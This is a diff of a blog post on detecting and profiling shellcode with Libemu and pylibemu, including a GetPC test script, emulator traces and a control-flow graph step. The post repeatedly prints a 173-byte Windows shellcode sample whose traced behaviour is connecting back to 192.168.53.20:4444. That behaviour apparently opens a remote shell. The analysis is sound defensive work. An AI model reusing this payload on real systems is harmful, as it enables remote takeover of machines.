@@ -34,14 +34,7 @@
                   <a href="/2013/geras-wuos-stack5-solutions.html">&lt&lt;</a> published on 06/Mar/2013<a href="/2013/libnids-pynids.html"> &gt;&gt;</i></a><br/>
                 </p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     <div class="post-content">
-          <p><a href="http://libemu.carnivore.it/">Libemu</a> is a C library that provides x86
-architecture emulation and
-<a href="http://www.infosecwriters.com/hhworld/shellcode.txt">shellcode</a>
-detection features. It uses
-<a href="http://skypher.com/wiki/index.php?title=Hacking/Shellcode/GetPC">GetPC</a>
-heuristics to identify shellcode blobs within an input buffer.</p>
-
-<blockquote>
+          <blockquote>
   <p><code>GetPC</code> is a shellcode writing technique, commonly used with
   <a href="http://www.blackhatlibrary.net/Shellcode/Self-modifying">selfmodifying</a>
   shellcode. Self-modification is a technique that enables a piece code
@@ -66,38 +59,38 @@ for example. Once both Libemu and it&#8217;s Python binding,
 <a href="https://github.com/buffer/pylibemu">pylibemu</a>, are installed we can
 have a quick validation test:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<pre><code>#!/usr/bin/env python
 
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">pylibemu</span>
+import sys
+import pylibemu
 
-<span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
-<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
-  <span class="n">buf</span> <span class="o">+=</span> <span class="n">line</span>
+buf = ""
+for line in sys.stdin.readlines():
+  buf += line
 
-<span class="k">print</span> <span class="s2">&quot;[+] Testing buf of fize </span><span class="si">%d</span><span class="s2">B ...&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+print "[+] Testing buf of fize %dB ..." % (len(buf))
 
-<span class="n">emu</span> <span class="o">=</span> <span class="n">pylibemu</span><span class="o">.</span><span class="n">Emulator</span><span class="p">()</span>
-<span class="n">offset</span> <span class="o">=</span> <span class="n">emu</span><span class="o">.</span><span class="n">shellcode_getpc_test</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+emu = pylibemu.Emulator()
+offset = emu.shellcode_getpc_test(buf)
 
-<span class="k">if</span> <span class="n">offset</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
-  <span class="k">print</span> <span class="s2">&quot;[+] IS SHELLCODE!&quot;</span>
-<span class="k">else</span><span class="p">:</span>
-  <span class="k">print</span> <span class="s2">&quot;[-] NOT SHELLCODE!&quot;</span>
-</code></pre></div>
+if offset &gt;= 0:
+  print "[+] IS SHELLCODE!"
+else:
+  print "[-] NOT SHELLCODE!"
+</code></pre>
 
 <p>Above program creates an <code>Emulator</code> instance and uses it to perform
 <code>GetPC</code> test upon input buffer. It can read raw input from stdin which
 in our case will be pipe&#8217;d through an <code>echo</code> command as such:</p>
 
-<div class="codehilite"><pre><span></span><code>$ <span class="nb">echo</span> -en <span class="s2">&quot;\xff\xff\xff\xff&quot;</span> <span class="p">|</span> python emutest.py
-<span class="o">[</span>+<span class="o">]</span> Testing buf of fize 4B ...
-<span class="o">[</span>-<span class="o">]</span> NOT SHELLCODE!
+<pre><code>$ echo -en "\xff\xff\xff\xff" | python emutest.py
+[+] Testing buf of fize 4B ...
+[-] NOT SHELLCODE!
 $
-$ <span class="nb">echo</span> -en <span class="s2">&quot;\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38&quot;</span> <span class="p">|</span> python emutest.py
-<span class="o">[</span>+<span class="o">]</span> Testing buf of fize 173B ...
-<span class="o">[</span>+<span class="o">]</span> IS SHELLCODE!
-</code></pre></div>
+$ echo -en "\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38" | python emutest.py
+[+] Testing buf of fize 173B ...
+[+] IS SHELLCODE!
+</code></pre>
 
 <p>As is evident, the sample buffer that was used in a pylibemu usage
 example is indeed identified as shellcode through the <code>GetPC</code> test.
@@ -106,39 +99,39 @@ profile shellcode bytes and identify Windows system calls, their
 parameters, return values, etc. This helps in understanding the behavior
 of identified shellcode:</p>
 
-<div class="codehilite"><pre><span></span><code>$ <span class="nb">echo</span> -en <span class="s2">&quot;\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38&quot;</span> <span class="p">|</span> python emuprofile.py
-<span class="o">[</span>+<span class="o">]</span> Testing buf of fize 173B ...
-<span class="o">[</span>+<span class="o">]</span> IS SHELLCODE!
-HMODULE LoadLibraryA <span class="o">(</span>
-  <span class="nv">LPCTSTR</span> <span class="o">=</span> <span class="nv">0x02288910</span> <span class="o">=</span>&gt;
-    <span class="o">=</span> <span class="s2">&quot;ws2_32&quot;</span><span class="p">;</span>
-<span class="o">)</span> <span class="o">=</span>  0x71a10000<span class="p">;</span>
-int WSAStartup <span class="o">(</span>
-  WORD <span class="nv">wVersionRequested</span> <span class="o">=</span> <span class="m">2</span><span class="p">;</span>
-  LPWSADATA <span class="nv">lpWSAData</span> <span class="o">=</span> <span class="m">1244272</span><span class="p">;</span>
-<span class="o">)</span> <span class="o">=</span>  0x0<span class="p">;</span>
-SOCKET WSASocket <span class="o">(</span>
-  int <span class="nv">af</span> <span class="o">=</span> <span class="m">2</span><span class="p">;</span>
-  int <span class="nb">type</span> <span class="o">=</span> <span class="m">1</span><span class="p">;</span>
-  int <span class="nv">protocol</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
-  LPWSAPROTOCOL_INFO <span class="nv">lpProtocolInfo</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
-  GROUP <span class="nv">g</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
-  DWORD <span class="nv">dwFlags</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
-<span class="o">)</span> <span class="o">=</span>  0x42<span class="p">;</span>
-int connect <span class="o">(</span>
-  SOCKET <span class="nv">s</span> <span class="o">=</span> <span class="m">66</span><span class="p">;</span>
-  struct sockaddr_in * <span class="nv">name</span> <span class="o">=</span> <span class="nv">0x0012fe88</span> <span class="o">=</span>&gt;
-    <span class="nv">struct</span> <span class="o">=</span> <span class="o">{</span>
-      short <span class="nv">sin_family</span> <span class="o">=</span> <span class="m">2</span><span class="p">;</span>
-      unsigned short <span class="nv">sin_port</span> <span class="o">=</span> <span class="m">23569</span> <span class="o">(</span><span class="nv">port</span><span class="o">=</span><span class="m">4444</span><span class="o">)</span><span class="p">;</span>
-      struct in_addr <span class="nv">sin_addr</span> <span class="o">=</span> <span class="o">{</span>
-        unsigned long <span class="nv">s_addr</span> <span class="o">=</span> <span class="m">339060928</span> <span class="o">(</span><span class="nv">host</span><span class="o">=</span><span class="m">192</span>.168.53.20<span class="o">)</span><span class="p">;</span>
-      <span class="o">}</span><span class="p">;</span>
-      char <span class="nv">sin_zero</span> <span class="o">=</span> <span class="s2">&quot;       &quot;</span><span class="p">;</span>
-    <span class="o">}</span><span class="p">;</span>
-  int <span class="nv">namelen</span> <span class="o">=</span> <span class="m">16</span><span class="p">;</span>
-<span class="o">)</span> <span class="o">=</span>  0x0<span class="p">;</span>
-</code></pre></div>
+<pre><code>$ echo -en "\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38" | python emuprofile.py
+[+] Testing buf of fize 173B ...
+[+] IS SHELLCODE!
+HMODULE LoadLibraryA (
+  LPCTSTR = 0x02288910 =&gt;
+    = "ws2_32";
+) =  0x71a10000;
+int WSAStartup (
+  WORD wVersionRequested = 2;
+  LPWSADATA lpWSAData = 1244272;
+) =  0x0;
+SOCKET WSASocket (
+  int af = 2;
+  int type = 1;
+  int protocol = 0;
+  LPWSAPROTOCOL_INFO lpProtocolInfo = 0;
+  GROUP g = 0;
+  DWORD dwFlags = 0;
+) =  0x42;
+int connect (
+  SOCKET s = 66;
+  struct sockaddr_in * name = 0x0012fe88 =&gt;
+    struct = {
+      short sin_family = 2;
+      unsigned short sin_port = 23569 (port=4444);
+      struct in_addr sin_addr = {
+        unsigned long s_addr = 339060928 (host=192.168.53.20);
+      };
+      char sin_zero = "       ";
+    };
+  int namelen = 16;
+) =  0x0;
+</code></pre>
 
 <p>The profiling API identifies critical windows API calls above and
 emulates them in its x86 emulator. The return values for all system
@@ -166,12 +159,12 @@ shellcode and write it to a
 <a href="http://en.wikipedia.org/wiki/DOT_%28graph_description_language%29">DOT</a>
 file which can then be rendered as an image:</p>
 
-<div class="codehilite"><pre><span></span><code>$ <span class="nb">echo</span> -en <span class="s2">&quot;\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38&quot;</span> &gt;shellcode.bin
+<pre><code>$ echo -en "\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38" &gt;shellcode.bin
 $
-$ sctest -Sgs <span class="m">1000000</span> -v -G test.dot &lt;shellcode.bin
+$ sctest -Sgs 1000000 -v -G test.dot &lt;shellcode.bin
 $
 $ dot shellcode.dot -Tpng -o shellcode.png
-</code></pre></div>
+</code></pre>
 
 <p>Here is the generated CFG image:</p>
 
